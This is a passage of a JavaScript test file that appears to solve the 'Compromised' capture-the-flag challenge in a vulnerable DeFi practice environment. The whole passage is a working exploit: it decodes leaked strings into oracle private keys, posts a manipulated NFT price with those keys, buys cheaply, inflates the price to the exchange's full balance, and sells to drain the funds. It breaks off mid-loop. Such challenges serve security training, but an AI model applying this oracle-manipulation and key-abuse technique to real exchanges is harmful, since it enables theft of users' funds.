...
describe("Compromised challenge", function () {
  ...
  it("Exploit", async function () {
    ...
    const privateKeys = strangeResponse.map((e) => {
      let toUtf8 = e
        .split(/\s/)
        .map((e) => Buffer.from(e, "hex").toString("utf8"))
        .join("");
      return Buffer.from(toUtf8, "base64").toString();
    });

    const MACILIOUS_PRICE = ethers.utils.parseEther("0.01").toString();
    const provider = ethers.provider;

    // deploy attack contract
    const CompromisedAttacker = await ethers.getContractFactory(
      "CompromisedAttacker"
    );

    this.attackerContract = await CompromisedAttacker.connect(attacker).deploy(
      this.exchange.address
    );

    // set median price to 0.1 ether
    for (let i = 0; i < privateKeys.length; i++) {
      const wallet = new ethers.Wallet(privateKeys[i], provider);
      expect(wallet.address).to.be.oneOf(sources);

      await this.oracle.connect(wallet).postPrice("DVNFT", MACILIOUS_PRICE);
    }

    // buy one
    await this.attackerContract
      .connect(attacker)
      .buyOne({ value: MACILIOUS_PRICE });

    const exchangeBalance = await ethers.provider.getBalance(
      this.exchange.address
    );
    // set median price to maximum balance of exchange
    for (let i = 0; i < privateKeys.length; i++) {
      const wallet = new ethers.Wallet(privateKeys[i], provider);

      await this.oracle
        .connect(wallet)
        .postPrice("DVNFT", exchangeBalance.toString());
    }

    // drain exchange fund by selling one
    await this.attackerContract.connect(attacker).sellOne();

    // set median price to initial price
    for (let i = 0; i < privateKeys.length; i++) {
      const wallet = new ethers.Wallet(privateKeys[i], provider);
